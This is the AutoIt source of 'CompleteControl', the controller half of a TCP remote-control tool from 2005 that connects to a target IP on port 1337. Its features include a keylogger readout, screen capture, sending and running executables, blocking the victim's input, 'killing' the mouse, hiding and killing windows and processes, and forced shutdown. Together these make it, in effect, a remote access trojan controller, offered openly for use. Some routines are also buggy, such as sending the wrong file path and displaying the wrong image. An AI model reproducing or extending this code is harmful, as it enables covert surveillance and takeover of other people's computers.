#cs
	Title:   CompleteControl
    Filename:  CompleteControl.au3
    Description: A program that gives control over a remote computer using TCP functions.
    Author:   Mason
    Version:  0.1
    Last Update: 10/17/05
    Requirements: AutoIt3 Beta(3.1.1.63 or higher), Developed/Tested on WindowsXP Home Edition
#ce

;Header Files
#include <GUIConstants.au3>
#include <GUIList.au3>
#include "Media.au3"
#include <GUICombo.au3>
#NoTrayIcon

;Global Variables
$isBlocking = False
$isMouseTrapped = False
$isConnected = False
Dim $IPAddress
Dim $Socket
$Port = "1337"

;Start
$maingui = GUICreate("CompleteControl v1.0", 600, 400, (@DesktopWidth-500)/2, (@DesktopHeight-500)/2);Create Window

;Menu
$FileMenu = GUICTrlCreateMenu("File")
$HelpMenu = GUICtrlCreateMenu("Help")
$FileConnection = GUICtrlCreateMenuItem("New Connection", $FileMenu)
$FileDisconnect = GUICtrlCreateMenuItem("Disconnect", $FileMenu)
GUICtrlSetState($FileDisconnect, $GUI_DISABLE)
$FileClose = GUICtrlCreateMenuItem("Exit", $FileMenu)
$HelpHelp = GUICtrlCreateMenuItem("Help", $Helpmenu)
$HelpCredits = GUICtrlCreateMenuItem("About", $HelpMenu)

;Main GUI
$ExitButton = GUICtrlCreateButton("Exit", 530, 360, 40, 20);Only thing on Main GUI
GUICtrlCreateTab(20, 20, 560, 340);Create Tab

;Window Management GUI
GUICtrlCreateTabItem("Window Management")
GUICtrlCreateLabel("Current Windows:", 50, 60)
GUICtrlCreateLabel("Hidden Windows:", 400, 60)
GUICtrlCreateLabel("Set Window Size:", 50, 320)
GUICtrlCreateLabel("Set Window Title:", 350, 320)
$RefreshWindows = GUICtrlCreateButton("Refresh", 100, 265, 50, 20)
$WinWidthEdit = GUICtrlCreateEdit("Width", 140, 317, 60, 21)
$WinHeightEdit = GUICtrlCreateEdit("Height", 210, 317, 60, 21)
$WinTitle = GUICtrlCreateEdit("Title", 440, 317, 60, 21)
$OKWinTitle = GUICtrlCreateButton("OK", 510, 317, 50, 20)
$OKWinSize = GUICtrlCreateButton("OK", 280, 317, 50, 20)
$HideWindow = GUICtrlCreateButton("Hide", 215, 100, 50, 20)
$MiniWindow = GUICtrlCreateButton("Minimize", 215, 130, 50, 20)
$KillWindow = GUICtrlCreateButton("Kill", 215, 160, 50, 20)
$UnhideWindow = GUICtrlCreateButton("Un-Hide", 455, 265, 50, 20)
$MinimizeAll = GUICtrlCreateButton("Minimize All", 280, 130, 75, 20)
$KillAll = GUICtrlCreateButton("Destroy All", 280, 190, 75, 20)
$FlashWindow = GUICtrlCreateButton("Flash", 215, 190, 50, 20)
$ActivateWindow = GUICtrlCreateButton("Activate", 215, 220, 50, 20)
$HiddenList = GUICtrlCreateList("", 400, 75, 150, 200)
$WinList = GUICTrlCreateList("", 50, 75, 150, 200)

;Process Management GUI
GUICtrlCreateTabItem("Process Management")
GUICtrlCreateLabel("WARNING", 425, 75)
GUICtrlCreateLabel("By changing a process's priority level", 365, 90)
GUICtrlCreateLabel("or ending a process it may cause the client's", 350, 105)
GUICtrlCreateLabel("computer to crash or make their computer", 355, 120)
GUICtrlCreateLabel("unstable.  Use these features with caution.", 355, 135)
GUICtrlCreateLabel("CurrentProcesses:", 50, 60)
$ProcessList = GUICtrlCreateList("", 50,75, 150, 250)
$KillProcess = GUICtrlCreateButton("Kill", 225, 125, 50, 20)
$RefreshProcesses = GUICtrlCreateButton("Refresh", 100, 325, 50, 20)
GUICtrlCreateLabel("Set Process Priority:", 225, 175)
$PriorityCombo = GUICtrlCreateCombo("", 225, 200, 150, 20)
$PriorityOK = GUICtrlCreateButton("OK", 225, 230, 30, 20)
_GUICtrLComboAddString($PriorityCombo, "Idle/Low")
_GUICtrlComboAddString($PriorityCombo, "Normal")
_GUICtrlComboAddString($PriorityCombo, "Realtime")

;Input GUI
GUICtrlCreateTabItem("Input")
GUICtrlCreateLabel("Send Keys:", 45, 65)
$KeySendEdit = GUICtrlCreateEdit("Keys", 105, 62, 100, 21)
$KeySendButton = GUICtrlCreateButton("OK", 215, 63, 25, 20)
GUICtrlCreateLabel("Mouse Kill:", 420, 65)
$MouseKillStartButton = GUICtrlCreateButton("Start", 475, 62, 40, 20)
$MouseKillStopButton = GUICtrlCreateButton("Stop", 525, 62, 40, 20)
GUICtrlCreateLabel("Block Input:", 250, 65)
$BlockInputStartButton = GUICtrlCreateButton("Start", 310, 62, 40, 20)
$BlockInputStopButton = GUIctrlCreateButton("Stop", 365, 62, 40, 20)
GUICtrlCreateLabel("Keylogger:", 271, 100)
$refreshkeylog = GUICtrlCreateButton("Refresh", 265, 120, 65, 20)
$KeyLogEdit = GUICtrlCreateEdit("", 60, 150, 475, 200)

;Screen Capture GUI
GUICtrlCreateTabItem("Screen Capture")
$ScreenCapButton = GUICtrlCreateButton("Refresh", 275, 330, 50, 20)
$ScreenCapPic = GUICtrlCreatePic("", 50, 65, 500, 260)

;Etc GUI
GUICtrlCreateTabItem("Etc")
$ShutdownButton = GUICtrlCreateButton("Shutdown", 100, 70, 75, 20)
$RestartButton = GUICtrlCreateButton("Restart", 200, 70, 75, 20)
$HibernateButton = GUICtrlCreateButton("Hibernate", 300, 70, 75, 20)
$CDDriveButton = GUICtrlCreateButton("Open CD Drive", 300, 95, 75, 20)
$LogoffButton = GUICtrlCreateButton("Log Off", 200, 95, 75, 20)
$PingButton = GUICtrlCreateButton("Ping", 400, 70, 75, 20)
$OSVersionButton = GUICtrlCreateButton("Get OS", 400, 95, 75, 20)
$BeepButton = GUICtrlCreateButton("Beep", 100, 95, 75, 20)
GUICtrlCreateLabel("Open Web Page:", 50, 152)
$IENavigateEdit = GUICtrlCreateEdit("URL", 150, 150, 150, 21)
$IENavigateGo = GUICtrlCreateButton("GO", 310, 150, 25, 20)
GUICtrlCreateLabel("Message Box:", 50, 180)
$MsgBoxTitle = GUICtrlCreateEdit("Title", 125, 178, 150, 21)
$MsgBoxMessage = GUICtrlCreateEdit("Message", 290, 178, 150, 21)
$MsgBoxConfirm = GUICtrlCreateButton("OK", 455, 178, 25, 20)
GUICtrlCreateLabel("Text to Speech:", 50, 210)
$TTSEdit = GUICtrlCreateEdit("Message", 140, 208, 200, 21)
$TTSButton = GUICtrlCreateButton("OK", 355, 208, 25, 20)
$TTSTestButton = GUICtrlCreateButton("Test", 390, 208, 30, 20)
GUICtrlCreateLabel("Send and Run Executable:", 50, 240)
$SendExeEdit = GUICtrlCreateEdit("File Path", 200, 238, 200, 21)
$SendExeBrowse = GUICtrlCreateButton("Browse", 410, 238, 45, 20)
$SendExeButton = GUICtrlCreateButton("Send", 465, 238, 40, 20)
GUICtrLCreateLabel("Play Sound:", 50, 270)
$SendSoundEdit = GUICtrlCreateEdit("File Path", 200, 268, 200, 21)
$SendSoundBrowse = GUICtrLCreateButton("Browse", 410, 268, 45, 21)
$SendSoundRecord = GUICtrlCreateButton("Record", 463, 268, 45, 21)
$SendSoundSend = GUICtrlCreateButton("Send", 515, 268, 45, 21)
GUICtrlCreateLabel("Tray Tip:", 50, 300)
$TrayTipTitleEdit = GUICtrlCreateEdit("Title", 100, 297, 100, 21)
$TrayTipMessageEdit = GUICtrlCreateEdit("Message", 220, 297, 100, 21)
$TrayTipOKButton = GUICtrlCreateButton("OK", 340, 298, 25, 20)
GUICtrlCreateLabel("Run:", 50, 330)
$RunCombo = GUICtrlCreateCombo("", 80, 327, 100, 20)
$RunOK = GUICtrlCreateButton("OK", 190, 327, 25, 20)
_GUICtrlComboAddString($RunCombo, "Notepad")
_GUICtrlComboAddString($RunCombo, "Paint")

GUICtrlSetState($refreshkeylog, $GUI_DISABLE)
GUICtrLSetState($KeyLogEdit, $GUI_DISABLE)

GUISetState();Show Window

;Make Sure they can use Winsock
If TCPStartup() = 0 Then
	MsgBox(0, "Error", "Winsock cannot initialize!")
	Exit
EndIf
AutoItSetOption("TCPTimeout", 1000)

;Message Loop
While 1
	
	$msg = GuiGetMsg();Get Messages
	
	If $msg = $GUI_EVENT_CLOSE Then;X Button
		ExitProgram()
	EndIf
	
	If $msg = $ExitButton Then;Exit Button
		ExitProgram()
	EndIf
	
	If $msg = $FileClose Then;File->Close
		ExitProgram()
	EndIf
	
	If $msg = $FileConnection Then;File->New Connection
		NewConnection()
	EndIf
	
	If $msg = $FileDisconnect Then;File->Disconnect
		Disconnect()
	EndIf
	
	;Controls for ETC Tab
	If $msg = $ShutdownButton Then
		InitiateShutdown()
	EndIf
	
	If $msg = $RestartButton Then
		InitiateRestart()
	EndIf
	
	If $msg = $HibernateButton Then
		InitiateHibernate()
	EndIf
	
	If $msg = $PingButton Then
		InitiatePing()
	EndIf
	
	If $msg = $BeepButton Then
		InitiateBeep()
	EndIf
	
	If $msg = $LogoffButton Then
		InitiateLogoff()
	EndIf
	
	If $msg = $CDDriveButton Then
		InitiateDriveOpen()
	EndIf
	
	If $msg = $OSVersionButton Then
		GetOS()
	EndIf
	
	If $msg = $IENavigateGo Then
		GoToPage()
	EndIf
	
	If $msg = $MsgBoxConfirm Then
		SendMsgBox()
	EndIf
	
	If $msg = $TTSButton Then
		SendTTS()
	EndIf
	
	If $msg = $TTSTestButton Then
		TestTTS()
	EndIf
	
	If $msg = $SendExeBrowse Then
		SendExeBrowse()
	EndIf
	
	If $msg = $SendExeButton Then
		SendExe()
	EndIf
	
	If $msg = $SendSoundBrowse Then
		SendSoundBrowse()
	EndIf
	
	;Controls for Screen Capture Tab
	If $msg = $ScreenCapButton Then
		ScreenCap()
	EndIf
	
	;Controls for Input Tab
	If $msg = $KeySendButton Then
		SendKeys()
	EndIf
		
	If $msg = $BlockInputStartButton Then
		BlockInputStart()
	EndIf
	
	If $msg = $BlockInputStopButton Then
		BlockInputStop()
	EndIf
	
	If $msg = $MouseKillStartButton Then
		MouseKill()
	EndIf
	
	If $msg = $MouseKillStopButton Then
		MouseKilLStop()
	EndIf
	
	;Controls for Process Management Tab
	If $msg = $RefreshProcesses Then
		RefreshProcesses()
	EndIf
	
	If $msg = $KillProcess Then
		KillProcess()
	EndIf
	
	;Controls for Window Management Tab
	If $msg = $RefreshWindows Then
		RefreshWindow()
	EndIf
	
	If $msg = $KillWindow Then
		KillWindow()
	EndIf
	
	If $msg = $MinimizeAll Then
		MiniAll()
	EndIf
	
	If $msg = $MiniWindow Then
		MiniWindow()
	EndIf
	
	If $msg = $FlashWindow Then
		FlashWindow()
	EndIf
	
	If $msg = $ActivateWindow Then
		ActivateWindow()
	EndIf
	
	If $msg = $HideWindow Then
		HideWindow()
	EndIf
	
	If $msg = $UnhideWindow Then
		UnHideWindow()
	EndIf
	
	If $msg = $KillAll Then
		KillAll()
	EndIf
	
	If $msg = $OKWinSize Then
		SetWinSize()
	EndIf
	
	If $msg = $OKWinTitle Then
		SetWindowTitle()
	EndIf
	
	If $msg = $PriorityOK Then
		SetProcPriority()
	EndIf
	
	If $msg = $SendSoundSend Then
		SendSound()
	EndIf
	
	If $msg = $SendSoundRecord Then
		RecordSound()
	EndIf
	
	If $msg = $TrayTipOKButton Then
		TrayTipCreate()
	EndIf
	
	If $msg = $RunOK Then
		RunProg()
	EndIf
	
	Sleep(1);No Max CPU Usage
WEnd

;UDFs
Func ExitProgram()
	If $isConnected = True Then
		Disconnect()
		TCPShutdown()
		Exit
	Else
		Exit
	EndIf
EndFunc

Func NewConnection()
	$IPAddress = InputBox("Client's IP", "Please Type the User's IP Address Here.")
	$Socket = TCPConnect($IPAddress, $Port)
	If $Socket = -1 Then
		MsgBox(0, "Error", "Could not connect to the client!")
	Else
		GUICtrlSetState($FileConnection, $GUI_DISABLE)
		GUICtrlSetState($FileDisconnect, $GUI_ENABLE)
		$isConnected = True
		MsgBox(0, "Success", "Successfully connected to the client!")
	EndIf
EndFunc

Func Disconnect()
	TCPSend($Socket, "end")
	$Disconnection = TCPCloseSocket($Socket)
	If $Disconnection = 0 Then
		MsgBox(0, "Error", "Could not close connection with client!")
	Else
		GUICtrlSetState($FileConnection, $GUI_ENABLE)
		GUICtrlSetState($FileDisconnect, $GUI_DISABLE)
		$isConnected = False
		MsgBox(0, "Success", "Successfully disconnected from the client!")
	EndIf
EndFunc

Func InitiateShutdown()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initshutdown = TCPSend($Socket, "shutdown")
		If $initshutdown = 0 Then
			MsgBox(0, "Error", "Unsuccessful shutdown intitiation.")
		Else
			Disconnect()
		EndIf
	EndIf
EndFunc

Func InitiateRestart()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initrestart = TCPSend($socket, "restart")
		If $initrestart = 0 Then
			MsgBox(0, "Error", "Unsuccessful restart intitiation.")
		Else
			Disconnect()
		EndIf
	EndIf
EndFunc

Func InitiatePing()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$ping = Ping($IPAddress)
		If $ping = 0 Then
			MsgBox(0, "Error", "Could not successfully Ping the client.")
		Else
			MsgBox(0, "Client's Ping", "The client's ping was: " & String($ping))
		EndIf
	EndIf
EndFunc

Func InitiateHibernate()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$inithibernate = TCPSend($socket, "hibernate")
		If $inithibernate = 0 Then
			MsgBox(0, "Error", "Unsuccessful hibernate intitiation.")
		Else
			Disconnect()
		EndIf
	EndIf
EndFunc

Func InitiateBeep()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initbeep = TCPSend($socket, "beep")
		If $initbeep = 0 Then
			MsgBox(0, "Error", "Unsuccessful beep initiation.")
		EndIf
	EndIf
EndFunc

Func InitiateLogoff()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initlogoff = TCPSend($socket, "logoff")
		If $initlogoff = 0 Then
			MsgBox(0, "Error", "Unsuccessful logoff initiation.")
		Else
			Disconnect()
		EndIf
	EndIf
EndFunc

Func InitiateDriveOpen()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initdrive = TCPSend($socket, "driveopen")
		If $initdrive = 0 Then
			MsgBox(0, "Error", "Unsuccessful CD Drive Open initiation.")
		EndIf
	EndIf
EndFunc

Func GetOS()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initOS = TCPSend($socket, "os")
		If $initos = 0 Then
			MsgBox(0, "Error", "Unsuccessful Get OS initiation.")
		Else
			$OS = TCPRecv($socket, 30)
			Dim $OperatingSystem = ""
			If $OS = "WIN_2003" Then
				$OperatingSystem = "Windows 2003"
			ElseIf $OS = "WIN_XP" Then
				$OperatingSystem = "Windows XP"
			ElseIf $OS = "WIN_2000" Then
				$OperatingSystem = "Windows 2000"
			ElseIf $OS = "WIN_NT4" Then
				$OperatingSystem = "Windows NT 4"
			ElseIf $OS = "WIN_ME" Then
				$OperatingSystem = "Windows ME"
			ElseIf $Os = "WIN_98" Then
				$OperatingSystem = "Windows 98"
			ElseIf $OS = "WIN_95" Then
				$OperatingSystem = "Windows 95"
			EndIf
			If $OperatingSystem = "" Then
				MsgBox(0, "Error", "There was an error when trying to receive the client's operating system.")
			Else
				MsgBox(0, "Client's Operating System", "The client's operating system is " & $OperatingSystem & ".")
			EndIf
		EndIf
	EndIf
EndFunc

Func GoToPage()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		Sleep(500)
		$initgotopage = TCPSend($socket, "iego")
		If $initgotopage = 0 Then
			MsgBox(0, "Error", "Could not initiate browser control.")
		Else
			TCPSend($socket, GUICtrlRead($IENavigateEdit))
		EndIf
	EndIf
EndFunc

Func SendMsgBox()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initmsgbox = TCPSend($socket, "msgbox")
		If $initmsgbox = 0 Then
			MsgBox(0, "Error", "Could not initiate Message Box control.")
		Else
			TCPSend($socket, GUICtrlRead($MsgBoxTitle))
			Sleep(500)
			TCPSend($socket, GUICtrlRead($MsgBoxMessage))
		EndIf
	EndIf
EndFunc

Func SendTTS()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initTTS = TCPSend($socket, "tts")
		If $initTTS = 0 Then
			MsgBox(0, "Error", "Could not initiate Text To Speech.")
		Else
			Sleep(500)
			TCPSend($socket, GUICtrlRead($TTSEdit))
		EndIf
	EndIf
EndFunc

Func TestTTS()
	$msgttstest = GUICtrlRead($TTSEdit)
	$o_speech = ObjCreate("SAPI.SpVoice")
	$o_speech.Speak($msgttstest)
	$o_speech = ""
EndFunc

Func SendExeBrowse()
	$exepath = FileOpenDialog("Select Executable to Send", "", "All (*.*)|Executable Files(*.exe)")
	GUICtrlSetData($SendExeEdit, $exepath)
EndFunc

Func SendSoundBrowse()
	$soundpath = FileOpenDialog("Select Sound to Send", "", "All (*.*)|Wav Files(*.wav)")
	GUICtrlSetData($SendSoundEdit, $soundpath)
EndFunc

Func SendSound()
	$soundexists = FileExists(GUICtrlRead($SendSoundEdit))
	If $soundexists = 0 Then
		MsgBox(0, "Error", "The file you gave does not exist.")
	Else
		If $isConnected = False Then
			MsgBox(0, "Error", "You don't have any connections to a client.")
		Else
			$initsound = TCPSend($socket, "playsound")
			If $initsound = 0 Then
				MsgBox(0, "Error", "Could not send the sound file.")
			Else
				SLeep(500)
				SendFile(GUICtrlRead($SendExeEdit))
				MsgBox(0, "Success", "Successfully sent sound!")
			EndIf
		EndIf
	EndIf
EndFunc

Func SendExe()
	$fileexists = FileExists(GUICtrlRead($SendExeEdit))
	If $fileexists = 0 Then
		MsgBox(0, "Error", "The file you gave does not exist.")
	Else
		If $isConnected = False Then
			MsgBox(0, "Error", "You don't have any connections to a client.")
		Else
			$initexe = TCPSend($socket, "sendexe")
			If $initexe = 0 Then
				MsgBox(0, "Error", "Could not send executable file.")
			Else
				Sleep(500)
				SendFile(GUICtrlRead($SendExeEdit))
				MsgBox(0, "Success", "Successfully sent file!")
			EndIf
		EndIf
	EndIf
EndFunc

Func SendFile($path)
	$buffer = DLLStructCreate("byte[" & FileGetSize($path) & "]")
	$fileHandle = _APIFileOpen($path)
	$bytes = _BinaryFileRead($fileHandle,$buffer)
	TCPSend($Socket,$buffer)
	
	$doneMsg = DllStructCreate("char[8]")
	$msg = ""
	While 1
		$bytes = TCPRecv($Socket,$doneMsg)
		If $bytes = -1 Then ExitLoop
		If $bytes > 0 Then $msg = $msg & DllStructGetData($doneMsg,1)
		If $msg = "alldone" Then ExitLoop
	WEnd
	_APIFileClose($fileHandle)
	DllStructDelete($buffer)
EndFunc

Func RefreshWindow()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connections to a client.")
	Else
		$initrefreshwindows = TCPSend($socket, "winlist")
		If $initrefreshwindows = 0 Then
			MsgBox(0, "Error", "Could not retrieve window list!")
		Else
			Sleep(500)
			$RecvWindowNum = TCPRecv($socket, 10)
			Dim $currentWindow
			_GUICtrlListClear($WinList)
			For $i = 1 to Number($RecvWindowNum)
				Sleep(500)
				$currentWindow = TCPRecv($socket, 100)
				_GUICtrlListAddItem($WinList, $currentWindow)
			Next
		EndIf
	EndIf
EndFunc

Func KillWindow()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client.")
	Else
		$index = _GUICtrlListSelectedIndex($WiNlist)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You have no window selected!")
		Else
			TCPSend($socket, "winkill")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($WinList, $index))
		EndIf
	EndIf
EndFunc

Func MiniAll()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client.")
	Else
		$initminiwindows = TCPSend($socket, "miniall")
		If $initminiwindows = 0 Then
			MsgBox(0, "Error", "Could not minimize all windows!")
		EndIf
	EndIf
EndFunc

Func MiniWindow()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($WiNlist)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You have no window selected!")
		Else
			TCPSend($socket, "miniwin")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($WinList, $index))
		EndIf
	EndIf
EndFunc

Func FlashWindow()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($WiNlist)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You have no window selected!")
		Else
			TCPSend($socket, "flashwin")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($WinList, $index))
		EndIf
	EndIf
EndFunc

Func ActivateWindow()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($WiNlist)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You have no window selected!")
		Else
			TCPSend($socket, "activewin")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($WinList, $index))
		EndIf
	EndIf
EndFunc

Func HideWindow()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($WiNlist)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You have no window selected!")
		Else
			TCPSend($socket, "hidewin")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($WinList, $index))
			_GUICtrlListAddItem($HiddenList, _GUICtrlListGetText($WinList, $index))
		EndIf
	EndIf
EndFunc

Func UnHideWindow()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($HiddenList)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You have no window selected!")
		Else
			TCPSend($socket, "unhidewin")
			Sleep(500)
			TcpSend($socket, _GUICtrlListGetText($HiddenList, $index))
			_GuiCtrlListDeleteItem($HiddenList, $index)
		EndIf
	EndIf
EndFunc

Func KillAll()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$initkillall = TCPSend($socket, "killall")
		If $initkillall = 0 Then
			MsgBox(0, "Error", "Could not kill all windows!")
		EndIf
	EndIf
EndFunc

Func RefreshProcesses()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$initrefreshprocesslist = TCPSend($socket, "rfrshproc")
		If $initrefreshprocesslist = 0 Then
			MsgBox(0, "Error", "Could not get process list!")
		Else
			_GUICtrlListClear($ProcessList)
			Sleep(500)
			$numofProcesses = TCPRecv($socket, 10)
			For $i = 1 to Number($numofProcesses)
				Sleep(500)
				$processname = TCPRecv($socket, 100)
				_GUICtrLListAddItem($ProcessList, $processname)
			Next
		EndIf
	EndIf
EndFunc

Func KillProcess()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($ProcessList)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You don't have a process selected!")
		Else
			TcpSend($socket, "killproc")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($ProcessList, $index))
		EndIf
	EndIf
EndFunc

Func SetWinSize()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($WinList)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You don't have a window selected!")
		Else
			TCPSend($socket, "winsize")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($WinList, $index))
			Sleep(500)
			TCPSend($socket, GUICtrlRead($WinWidthEdit))
			Sleep(500)
			TCPSend($socket, GUICtrlRead($WinHeightEdit))
		EndIf
	EndIf
EndFunc

Func SetWindowTitle()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have any connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($Winlist)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You don't have a window selected!")
		Else
			TCPSend($socket, "wintitle")
			Sleep(500)
			TCPSend($socket, _GUICtrlListGetText($Winlist, $index))
			Sleep(500)
			TCPSend($socket, GUICtrlRead($WinTitle))
		EndIf
	EndIf
EndFunc

Func SetProcPriority()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		$index = _GUICtrlListSelectedIndex($ProcessList)
		If $index = $LB_ERR Then
			MsgBox(0, "Error", "You don't have a process selected!")
		Else
			TCPSend($socket, "procprior")
			Sleep(500)
			TCPSend($socket, _GUICTrlListGetText($ProcessList, $index))
			Sleep(500)
			TCPSend($socket, GUICtrlRead($PriorityCombo))
		EndIf
	EndIf
EndFunc

Func SendKeys()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		$initkeysend = TCPSend($socket, "keysend")
		If $initkeysend = 0 Then
			MsgBox(9, "Error", "Could not send keys properly!")
		Else
			Sleep(500)
			TCPSend($socket, GUICtrlRead($KeySendEdit))
		EndIf
	EndIf
EndFunc

Func BlockInputStart()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		If $isBlocking = False Then
			$initblockinput = TCPSend($socket, "startblock")
			If $initblockinput = 0 Then
				MsgBox(9, "Error", "Could not block input properly!")
			Else
				$isBlocking = True
			EndIf
		Else
			MsgBox(0, "Error", "Already blocking client's input!")
		EndIf
	EndIf
EndFunc

Func BlockInputStop()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		If $isBlocking = True Then
			$initblockinput= TCPSend($socket, "stopblock")
			If $initblockinput = 0 Then
				MsgBox(0, "Error", "Could not stop blocking input!")
			Else
				$isBlocking = False
			EndIf
		Else
			MsgBox(0, "Error", "You haven't started blocking client's input!")
		EndIf
	EndIf
EndFunc

Func MouseKill()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		If $isMouseTrapped = False Then
			$initMouseTrap = TCPSend($socket, "mousekill")
			If $initMouseTrap = 0 Then
				MsgBox(0, "Error", "Could not kill mouse!")
			Else
				$isMouseTrapped = True
			EndIf
		Else
			MsgBox(0, "Error", "Client's mouse is already dead!")
		EndIf
	EndIf
EndFunc

Func MouseKillSTop()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		If $isMouseTrapped = True Then
			$initMouseTrap = TCPSend($socket, "mouseback")
			If $initMouseTrap = 0 Then
				MsgBox(0, "Error", "Could not revive mouse!")
			Else
				$isMouseTrapped = False
			EndIf
		Else
			MsgBox(0, "Error", "Client's mouse isn't dead!")
		EndIf
	EndIf
EndFunc
	
Func RecordSound()
	$recordGUI = GUICreate("Record Sound", 300, 150, (@DesktopWidth-400)/2, (@DesktopHeight-400)/2, $WS_SIZEBOX, $WS_EX_TOPMOST, $maingui)
	
	$cancel = GUICtrlCreateButton("Cancel", 130, 100, 40, 20)
	$startrecording = GUICtrlCreateButtoN("Start Recording", 20, 20, 120, 75)
	$stoprecording = GUICtrlCreateButton("Stop Recoording", 160, 20, 120, 75)
	GUISetState(@SW_SHOW, $recordGUI)
	While 1
		$msg = GUIGetMsg()
		If $msg = $startrecording Then
			$Media=_MediaCreate(6)
			_MediaRecord($Media)
			While 1
				$msg2 = GUIGetMsg()
				If $msg2 = $stoprecording Then
					ExitLoop
				EndIf
				If $msg2 = $startrecording Then
					MsgBox(0, "Error", "You are already recording!")
				EndIf
			WEnd
			_MediaStop($Media)
			$File=FileSaveDialog("","","Wave files (*.wav)")&".wav"
			_MediaSave($Media,$File)
			_MediaClose($Media)
			GUICtrlSetData($SendSoundEdit, $File)
			GUIDelete($recordGUI)
			ExitLoop
		EndIf
		If $msg = $StopRecording Then
			MsgBox(0, "Error", "You haven't started recording yet!")
		EndIf
		If $msg = $cancel Then
			GUIDelete($recordGUI)
			ExitLoop
		EndIf
	WEnd
EndFunc

Func TrayTipCreate()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		$initTraytip = TCPSend($socket, "traytip")
		If $inittraytip = 0 Then
			MsgBox(0, "Error", "Could not create a tray tip on client's computer!")
		Else
			Sleep(500)
			TCPSend($socket, GUICtrlRead($TrayTipTitleEdit))
			Sleep(500)
			TCPSend($socket, GUICtrlRead($TrayTipMessageEdit))
		EndIf
	EndIf
EndFunc

Func RunProg()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		$initRun = TCPSend($socket, "run")
		If $initRun = 0 Then
		MsgBox(0, "Error", "Could not make client run program!")
		Else
			Sleep(500)
			TCPSend($socket, GUICtrlRead($RunCombo))
		EndIf
	EndIf
EndFunc

Func ScreenCap()
	If $isConnected = False Then
		MsgBox(0, "Error", "You don't have a connection to a client!")
	Else
		$initcap = TCPSend($socket, "screencap")
		If $initcap = 0 Then
			MsgBox(0, "Error", "Could not capture client's screen!")
		Else
			Sleep(500)
			RecvFile("screen.jpg")
			GUICtrlSetImage($ScreenCapPic, "proofofpurchase.jpg")
		EndIf
	EndIf
EndFunc


Func RecvFile($path)
	FileDelete($path)
	$fileHandle = _APIFileOpen($path)
	$bSending = 0
	$buffer = DLLStructCreate("byte[2048]")
	While 1
		$bytes = TCPRecv($Socket,$buffer)
		If (@error Or $bytes = "") And $bSending Then ExitLoop
		If $bytes > 0 Then
			If Not $bSending Then $bSending = 1
			_BinaryFileWrite($fileHandle, $buffer, $bytes)
		EndIf
	WEnd
	_APIFileClose($fileHandle)
	DLLStructDelete($buffer)
	$buffer = DLLStructCreate("char[8]")
	DllStructSetData($buffer,1,"alldone")
	TCPSend($Socket,$buffer)
	DLLStructDelete($buffer)
EndFunc	

		
; _APIFileOpen( <FileName> )
;
; Returns a "REAL" file handle for reading and writing.
; The return value comes directly from "CreateFile" api.
